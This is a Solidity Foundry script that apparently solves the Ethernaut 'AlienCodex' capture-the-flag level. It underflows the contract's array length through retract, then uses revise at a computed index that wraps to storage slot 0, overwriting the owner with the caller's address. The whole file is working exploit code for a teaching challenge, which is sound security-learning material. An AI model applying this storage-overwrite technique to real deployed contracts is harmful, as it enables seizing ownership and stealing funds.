// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IAlienCodex{

    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;

}

contract Level19Sol is Script{
    IAlienCodex public instance = IAlienCodex(0xe5EC55D210Edd23dBB7d055E9ed63DAA8E35e493);
    function run() external{
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

   

    uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
    bytes32 myAddress =  bytes32(uint256(uint160(vm.envUint("MY_ADDRESS"))));

    instance.makeContact();
    instance.retract();
    instance.revise(index,myAddress);

    bytes32 newOwner = vm.load(address(instance),bytes32(uint(0)));

    console.logBytes32(newOwner);

    vm.stopBroadcast();

    }

     

}